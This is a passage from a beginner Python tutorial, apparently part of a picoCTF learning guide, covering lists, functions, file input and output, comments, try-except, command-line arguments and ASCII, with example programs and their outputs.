                    <p>When then condition in an if-clause is not met, it enters the 'else' to execute
                        what is inside. You should still see this output when you run the program:</p>
                </div>
                <div class="listingblock">
                    <div class="content">
                        <pre class="pygments highlight"><code data-lang="text"><span></span>$ python3 helloworld.py
The following number is less than 5
0
The following number is less than 5
1
The following number is less than 5
2
The following number is less than 5
3
The following number is less than 5
4
The following number is greater than or equal to 5
5
The following number is greater than or equal to 5
6
The following number is greater than or equal to 5
7
The following number is greater than or equal to 5
8
The following number is greater than or equal to 5
9</code></pre>
                    </div>
                </div>
                <div class="paragraph">
                    <p>To practice, implement a program that prints a range of 100 numbers and prints
                        a different message when the numbers are smaller than 10, another message when
                        the numbers are between 10 and 50, and another message when the numbers are
                        greater than 50.</p>
                </div>
                <div class="sect2">
                    <h3 id="_lists">4.1. Lists</h3>
                    <div class="paragraph">
                        <p>There are several data structures in python, which are simply structures to
                            organize data in a certain manner. Different data structures have different
                            properties. We are going to introduce one that is called a 'list', which allows
                            us to store several values, one after the other.</p>
                    </div>
                    <div class="paragraph">
                        <p>We create a list like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">my_list</span> <span class="tok-o">=</span> <span class="tok-p">[</span><span class="tok-s2">&quot;I&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;Love&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;picoCTF&quot;</span><span class="tok-p">]</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">my_list</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We can iterate in the list to operate on each item in any way we want. For
                            example, suppose we want to print each item of the list, we could do this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">my_list</span> <span class="tok-o">=</span> <span class="tok-p">[</span><span class="tok-s2">&quot;I&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;Love&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;picoCTF&quot;</span><span class="tok-p">]</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">my_list</span><span class="tok-p">))</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">my_list</span><span class="tok-p">)</span>
<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-n">my_list</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>When you run that program, you should see the following output:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>3
[&#39;I&#39;, &#39;Love&#39;, &#39;picoCTF&#39;]
I
Love
picoCTF</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that the number 3 printed is the length of the list. You can sort the list
                            alphabetically by calling a function that is part of the list like this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">my_list</span> <span class="tok-o">=</span> <span class="tok-p">[</span><span class="tok-s2">&quot;this&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;is&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;not&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;ordered&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;alphabetically&quot;</span><span class="tok-p">]</span>
<span class="tok-n">my_ordered_list</span> <span class="tok-o">=</span> <span class="tok-n">my_list</span><span class="tok-o">.</span><span class="tok-n">sort</span><span class="tok-p">()</span>
<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-n">my_list</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see this output when you run that program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>alphabetically
is
not
ordered
this</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, create a list of numbers, and print it backwards! Using google, it should
                            be very easy to find how to do it.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_functions">4.2. Functions</h3>
                    <div class="paragraph">
                        <p>If you have a piece of code that you want to use often, copy pasting that piece
                            of code is a bad idea because your code gets longer and for a human becomes
                            harder to read. On the other hand, if you want to make a modification in that
                            piece of code, you will have to modify every part in which you copy and pasted
                            that code. We can overcome that by using functions. A function can receive
                            parameters, which are variables you pass to the function so operations with
                            them can be done. Additionally, a function can return a value, which is the
                            result after all the operations are done. Lets see an example of a function
                            that verifies if a number is even or odd. If it is even, it will return True.
                            If it is odd, it will return False. The program receives any number you input
                            and verifies such an input. Note that the '%' operator in the code is the
                            modulo operator, which calculates the remainder. In this case we calculate the
                            remainder of x divided by 2 and compare that to zero to determine if the number
                            is even or odd. Read the code to understand!</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-k">def</span> <span class="tok-nf">even_odd</span><span class="tok-p">(</span><span class="tok-n">x</span><span class="tok-p">):</span>
    <span class="tok-k">if</span> <span class="tok-p">(</span><span class="tok-n">x</span> <span class="tok-o">%</span> <span class="tok-mi">2</span> <span class="tok-o">==</span> <span class="tok-mi">0</span><span class="tok-p">):</span>
        <span class="tok-k">return</span> <span class="tok-kc">True</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
        <span class="tok-k">return</span> <span class="tok-kc">False</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input a number:&quot;</span><span class="tok-p">)</span>
<span class="tok-n">my_number</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>

<span class="tok-k">if</span> <span class="tok-n">even_odd</span><span class="tok-p">(</span><span class="tok-n">my_number</span><span class="tok-p">):</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The number is even&quot;</span><span class="tok-p">)</span>
<span class="tok-k">else</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The number is odd&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Run that program and try several numbers!</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_input_and_output">4.3. Input and output</h3>
                    <div class="paragraph">
                        <p>A program might need to have interactions with a user. For example, a
                            calculator expects that the user enters some numbers to then do the processing.
                            Receiving user input in a terminal is very easy in python because it has
                            predefined functions that do it for us. The function input() waits until the
                            user writes something in the terminal and presses enter. Note that a function
                            can have zero parameters. Then, the function returns the string that the user
                            wrote, and we assign it to the variable number_iterations. Here is an example,
                            in which we allow the user to control the number of iterations of our program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input the number of iterations:&quot;</span><span class="tok-p">)</span>
<span class="tok-n">number_iterations</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>

<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-n">number_iterations</span><span class="tok-p">):</span>

    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&lt;</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is less than 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is greater than or equal to 5&quot;</span><span class="tok-p">)</span>

    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Run that program. When you run it, it will do nothing until you input a number in the
                            terminal and press enter.</p>
                    </div>
                    <div class="paragraph">
                        <p>In other cases, the data we want to input does not have to come from the user.
                            It could come from a file. We can read all the lines from a file using the
                            function 'open'. Create a file called pico.txt in the same folder that you
                            are creating the python programs. Then, in that file copy and paste this text:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>The Cosmos is all that is or was or ever will be.
Our feeblest contemplations of the Cosmos stir us
-- there is a tingling in the spine,
a catch in the voice,
a faint sensation,
as if a distant memory,
of falling from a great height.
We know we are approaching the greatest of mysteries.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Save the file. Now, in the same folder, create a program with the following
                            code:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">filepath</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;pico.txt&quot;</span>
<span class="tok-n">i</span> <span class="tok-o">=</span> <span class="tok-mi">1</span>

<span class="tok-k">with</span> <span class="tok-nb">open</span><span class="tok-p">(</span><span class="tok-n">filepath</span><span class="tok-p">,</span> <span class="tok-s2">&quot;r&quot;</span><span class="tok-p">)</span> <span class="tok-k">as</span> <span class="tok-n">my_file</span><span class="tok-p">:</span>
    <span class="tok-k">for</span> <span class="tok-n">line</span> <span class="tok-ow">in</span> <span class="tok-n">my_file</span><span class="tok-p">:</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">line</span><span class="tok-p">)</span>
        <span class="tok-n">i</span> <span class="tok-o">+=</span> <span class="tok-mi">1</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>You should see the following output when you run the program:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>1
The Cosmos is all that is or was or ever will be.
2
Our feeblest contemplations of the Cosmos stir us
3
-- there is a tingling in the spine,
4
a catch in the voice,
5
a faint sensation,
6
as if a distant memory,
7
of falling from a great height.
8
We know we are approaching the greatest of mysteries.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>As you saw, this program reads a file and enumerates each line in the output.
                            The 'open' function has two parameters, the first one is the path of the file
                            you want to open, and the second has a string with the letter 'r', which means
                            that we want to <strong>r</strong>ead the file. 'my_file' is just the name of the file we
                            want to read. Then, we can iterate over each of the lines of the file in a for
                            loop.</p>
                    </div>
                    <div class="paragraph">
                        <p>Note that this is all made inside a 'with' block. We use the 'with' statement
                            before opening a file to close the file automatically after reading. Also, to
                            handle possible exceptions during the execution. What that means is that when
                            you open a file, you must close it and make sure that it closes correctly. For
                            example, if you do my_file.close(), that would close the file. Imagine that
                            along the way before calling close, something happens and you never get to the
                            line in which you close the file, so you left it open accidentally. Later we
                            will give you more details on exceptions. For the time being, just think of
                            'with' as an easy way to ensure that the file will be closed correctly.</p>
                    </div>
                    <div class="paragraph">
                        <p>If you want to save your output in another file, you can easily do it in the
                            following manner:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">filepath_read</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;pico.txt&quot;</span>
<span class="tok-n">filepath_write</span> <span class="tok-o">=</span> <span class="tok-s2">&quot;outputpico.txt&quot;</span>
<span class="tok-n">i</span> <span class="tok-o">=</span> <span class="tok-mi">1</span>

<span class="tok-k">with</span> <span class="tok-nb">open</span><span class="tok-p">(</span><span class="tok-n">filepath_read</span><span class="tok-p">,</span> <span class="tok-s2">&quot;r&quot;</span><span class="tok-p">)</span> <span class="tok-k">as</span> <span class="tok-n">file_read</span><span class="tok-p">:</span>
    <span class="tok-k">with</span> <span class="tok-nb">open</span><span class="tok-p">(</span><span class="tok-n">filepath_write</span><span class="tok-p">,</span> <span class="tok-s2">&quot;w&quot;</span><span class="tok-p">)</span> <span class="tok-k">as</span> <span class="tok-n">file_write</span><span class="tok-p">:</span>
       <span class="tok-k">for</span> <span class="tok-n">line</span> <span class="tok-ow">in</span> <span class="tok-n">file_read</span><span class="tok-p">:</span>
            <span class="tok-n">file_write</span><span class="tok-o">.</span><span class="tok-n">write</span><span class="tok-p">(</span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span> <span class="tok-o">+</span> <span class="tok-s2">&quot;</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
            <span class="tok-n">file_write</span><span class="tok-o">.</span><span class="tok-n">write</span><span class="tok-p">(</span><span class="tok-n">line</span> <span class="tok-o">+</span> <span class="tok-s2">&quot;</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
            <span class="tok-n">i</span> <span class="tok-o">+=</span> <span class="tok-mi">1</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;look inside your folder...&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We introduced some new concepts in this code. This:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Is a cast from an integer to string. We want to convert that integer into a
                            string to be able to concatenate two strings. For example, if we have the
                            string "hello" and the integer 123, and we want to create a string that is
                            "hello123", we can concatenate those two values. But first, we need to convert
                            the integer to string, otherwise python will show an error. To concatenate
                            strings, we use the operator '+'. When we add two strings, python will
                            concatenate them. When we add two integers, python will do a mathematical
                            addition. To represent a break of line in a string, we use "\n".</p>
                    </div>
                    <div class="paragraph">
                        <p>After this explanation, you should know that this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span> <span class="tok-o">+</span> <span class="tok-s2">&quot;</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Simply converts an integer to string, and then we concatenate a break line to
                            it. We do that, because the function line write() does not add a breakline to
                            the string after it writes it, so we would have a file with a single huge line
                            of text if we dont do that. When you run the code, you should see no output in
                            the terminal, but if you show the contents of the folder you are in, you should
                            see a new file called 'outputpico.txt'. If you show the contents of that file,
                            you should see the following:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ cat outputpico.txt
1
The Cosmos is all that is or was or ever will be.
2
Our feeblest contemplations of the Cosmos stir us
3
-- there is a tingling in the spine,
4
a catch in the voice,
5
a faint sensation,
6
as if a distant memory,
7
of falling from a great height.
8
We know we are approaching the greatest of mysteries.</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>We just learned how to read and create files!</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_comments">4.4. Comments</h3>
                    <div class="paragraph">
                        <p>It is a good practice to explain what your code is doing in a comment. In that
                            way, the reader of the code, which may be yourself, will understand what some
                            part of the code is doing. You will realize that when you write some code, you
                            will forget the exact logic and you will have to read it again to understand
                            what you did. In summary, comments are something very important in programming.
                            In python, you write a comment by adding the '#' symbol at the beginning of any
                            line of your code. This line, will be ignored by the python interpreter as it
                            did not exist, so it does nothing in the program. See the following example:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input the number of iterations&quot;</span><span class="tok-p">)</span>

<span class="tok-c1"># We read user input and assign it to the variable number_iterations</span>
<span class="tok-n">number_iterations</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>

<span class="tok-c1"># We iterate according to the value input by the user</span>
<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-n">number_iterations</span><span class="tok-p">):</span>
    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&lt;</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-c1"># We only print this message when the value of i is less than 5</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is less than 5&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
        <span class="tok-c1"># We only print the value of i is greater than or equal to 5</span>
        <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is greater than or equal to 5&quot;</span><span class="tok-p">)</span>

    <span class="tok-c1"># We always print this</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_try_except_and_exceptions">4.5. Try-except and exceptions</h3>
                    <div class="paragraph">
                        <p>Exceptions are useful in hacking in several cases, for example, when you want
                            an attack to keep executing even if an unknown error occurred. When a program
                            tries to execute an instruction that even though it has a correct syntax, it
                            cannot be done for some other reason, an exception is thrown. For example, if
                            you try to divide a number by zero, that can have the correct syntax to do it,
                            but when the program is executing the line it will stop and fail. Lets do the
                            experiment:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">num1</span> <span class="tok-o">=</span> <span class="tok-mi">8</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input the number that will divide:&quot;</span><span class="tok-p">)</span>
<span class="tok-n">num2</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>
<span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">num1</span> <span class="tok-o">/</span> <span class="tok-n">num2</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The program keeps executing to do other stuff...&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>As you can see the program divides 8 by any number input by the user. If you
                            run it and input for example 2, nothing bad will happen, and you will see this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>Input the number that will divide:
2
4
The program keeps executing to do other stuff...</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now, run the program again and input 0, you will see this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>Input the number that will divide:
0
Traceback (most recent call last):
  File &quot;helloworld.py&quot;, line 4, in &lt;module&gt;
    result = num1 / num2
ZeroDivisionError: integer division or modulo by zero</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>An error ocurred because you cannot divide by zero. That is a rule of python
                            and most programming languages. Your program will stop when an error happens,
                            further lines will not be executed. In this case, you could verify that the
                            number is not zero in an if-clause. For this example, lets fix the program
                            instead using a try-except:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">num1</span> <span class="tok-o">=</span> <span class="tok-mi">8</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input the number that will divide:&quot;</span><span class="tok-p">)</span>
<span class="tok-n">num2</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>

<span class="tok-k">try</span><span class="tok-p">:</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">num1</span> <span class="tok-o">/</span> <span class="tok-n">num2</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
<span class="tok-k">except</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;An error has occurred, did you try to divide by zero?&quot;</span><span class="tok-p">)</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The program keeps executing to do other stuff...&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>In our previous code, you would print the same message for any error. Try to
                            input a string instead of 0. It will show the same message. If you want to be
                            more specific, you can catch specific errors in the following manner:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">num1</span> <span class="tok-o">=</span> <span class="tok-mi">8</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Input the number that will divide:&quot;</span><span class="tok-p">)</span>

<span class="tok-k">try</span><span class="tok-p">:</span>
    <span class="tok-n">num2</span> <span class="tok-o">=</span> <span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-nb">input</span><span class="tok-p">())</span>
    <span class="tok-n">result</span> <span class="tok-o">=</span> <span class="tok-n">num1</span> <span class="tok-o">/</span> <span class="tok-n">num2</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-n">result</span><span class="tok-p">)</span>
<span class="tok-k">except</span> <span class="tok-ne">ZeroDivisionError</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Do not divide by zero, that is forbidden.&quot;</span><span class="tok-p">)</span>
<span class="tok-k">except</span> <span class="tok-ne">ValueError</span><span class="tok-p">:</span>
    <span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;Your input value must be an integer.&quot;</span><span class="tok-p">)</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;The program keeps executing to do other stuff...&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Now when you input a string, it will show this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>Input the number that will divide:
&quot;Any string&quot;
Your input value must be an integer.
The program keeps executing to do other stuff...</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>And if you input zero it will show this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>Input the number that will divide:
0
Do not divide by zero, that is forbidden.
The program keeps executing to do other stuff...</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Note that when an error occurs, the following lines inside the 'try' block will
                            not execute. See that 'result' is not printed, and that makes sense because
                            there was no result to print. The program jumps into the except block
                            immediately.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_pass_arguments_to_a_python_program">4.6. Pass arguments to a python program</h3>
                    <div class="paragraph">
                        <p>When you call a program from the command line, it is possible to pass arguments
                            in the same way you do with several programs in the terminal. The following
                            program shows how to do this:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-kn">import</span> <span class="tok-nn">sys</span>

<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s1">&#39;Number of arguments:&#39;</span><span class="tok-p">,</span> <span class="tok-nb">len</span><span class="tok-p">(</span><span class="tok-n">sys</span><span class="tok-o">.</span><span class="tok-n">argv</span><span class="tok-p">),</span> <span class="tok-s1">&#39;arguments.&#39;</span><span class="tok-p">)</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s1">&#39;Argument List:&#39;</span><span class="tok-p">,</span> <span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">sys</span><span class="tok-o">.</span><span class="tok-n">argv</span><span class="tok-p">))</span>

<span class="tok-c1"># The number of iterations is taken from the second argument.</span>
<span class="tok-c1"># (Remember that in an array [0] is the first one, [1] is the second one.)</span>
<span class="tok-n">number_iterations</span> <span class="tok-o">=</span> <span class="tok-n">sys</span><span class="tok-o">.</span><span class="tok-n">argv</span><span class="tok-p">[</span><span class="tok-mi">1</span><span class="tok-p">]</span>

<span class="tok-n">f</span> <span class="tok-o">=</span> <span class="tok-nb">open</span><span class="tok-p">(</span><span class="tok-s2">&quot;output2.txt&quot;</span><span class="tok-p">,</span> <span class="tok-s2">&quot;w&quot;</span><span class="tok-p">)</span>

<span class="tok-k">for</span> <span class="tok-n">i</span> <span class="tok-ow">in</span> <span class="tok-nb">range</span><span class="tok-p">(</span><span class="tok-nb">int</span><span class="tok-p">(</span><span class="tok-n">number_iterations</span><span class="tok-p">)):</span>
    <span class="tok-k">if</span> <span class="tok-n">i</span> <span class="tok-o">&lt;</span> <span class="tok-mi">5</span><span class="tok-p">:</span>
        <span class="tok-n">f</span><span class="tok-o">.</span><span class="tok-n">write</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is less than 5</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
    <span class="tok-k">else</span><span class="tok-p">:</span>
        <span class="tok-n">f</span><span class="tok-o">.</span><span class="tok-n">write</span><span class="tok-p">(</span><span class="tok-s2">&quot;The following number is greater than or equal to 5</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>
    <span class="tok-n">f</span><span class="tok-o">.</span><span class="tok-n">write</span><span class="tok-p">(</span><span class="tok-nb">str</span><span class="tok-p">(</span><span class="tok-n">i</span><span class="tok-p">)</span><span class="tok-o">+</span><span class="tok-s2">&quot;</span><span class="tok-se">\n</span><span class="tok-s2">&quot;</span><span class="tok-p">)</span>

<span class="tok-n">f</span><span class="tok-o">.</span><span class="tok-n">close</span><span class="tok-p">()</span>
<span class="tok-nb">print</span><span class="tok-p">(</span><span class="tok-s2">&quot;look inside your folder...&quot;</span><span class="tok-p">)</span></code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Put this code into a file called "args.py". If you run it without any
                            arguments, it will throw an error:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ python3 args.py
Number of arguments: 1 arguments.
Argument List: [&#39;args.py&#39;]
Traceback (most recent call last):
  File &quot;args.py&quot;, line 8, in &lt;module&gt;
    number_iterations = sys.argv[1]
IndexError: list index out of range</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>This error happened because the program is expecting an argument on the command
                            line, but none is given. More specifically, the second argument in the argument
                            list is queried <code>sys.argv[1]</code> but it doesn&#8217;t exist! Do take note, however,
                            that
                            even without supplying any arguments to the program, the program name is
                            considered the first argument. To run this program properly, we must include an
                            integer argument to our program call:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre class="pygments highlight"><code data-lang="text"><span></span>$ python3 args.py 6
Number of arguments: 2 arguments.
Argument List: [&#39;args.py&#39;, &#39;6&#39;]
look inside your folder...

$ cat output2.txt
The following number is less than 5
0
The following number is less than 5
1
The following number is less than 5
2
The following number is less than 5
3
The following number is less than 5
4
The following number is greater than or equal to 5
5</code></pre>
                        </div>
                    </div>
                    <div class="paragraph">
                        <p>Take note that since we did not use <code>with</code> to open our file, we had to close it
                            manually with the line:</p>
                    </div>
                    <div class="listingblock">
                        <div class="content">
                            <pre
                                class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">f</span><span class="tok-o">.</span><span class="tok-n">close</span><span class="tok-p">()</span></code></pre>
                        </div>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_ascii">4.7. ASCII</h3>
                    <div class="paragraph">
                        <p>ASCII is a way in which a computer represents characters. We could say that in
                            memory a computer only stores numbers, but a program can interpret those
                            numbers in a certain way to understand them as characters.</p>
                    </div>
                    <div class="paragraph">
                        <p>In the following table, it is shown what number corresponds to each character
                            in ASCII:</p>
                    </div>
                    <div class="imageblock text-center">
                        <div class="content">
                            <img src="images/4image1.png" alt="image" width="624" height="46">
                        </div>
                        <div class="title">Figure 7. ASCII Table Ref <a
                                href="http://www.asciitable.com">http://www.asciitable.com</a></div>
                    </div>
                    <div class="paragraph">
                        <p>The ASCII includes all the characters that are used in the English language.
                            For other languages, there is a bigger character set called Unicode.</p>
                    </div>
                    <div class="paragraph">
                        <p>For example, in the ASCII table, you can see that the @ symbol is represented
                            as the 64 number in decimal.</p>
                    </div>
                    <div class="paragraph">
                        <p>The table also has a column called Hx or Hexadecimal, which is base 16. Decimal
                            is base 10.</p>
                    </div>
                    <div class="paragraph">
                        <p>The decimal base is the one we use in everyday life, which likely comes from
                            the fact that humans have 10 fingers. Therefore, we have 10 different symbols
                            to represent all different numbers. In computers, it is helpful to have a base
                            with 16 symbols because it translates easier to binary. You probably know that
                            most computers physically store only binary numbers, which are represented only
                            by 0 and 1. A <strong>b</strong>inary dig<strong>it</strong> is called a bit. Although
                            computers use
                            binary, base 16 is easy to translate from binary for us humans.</p>
                    </div>
                    <div class="paragraph">
                        <p>The hexadecimal base (or base 16) has the following symbols:</p>
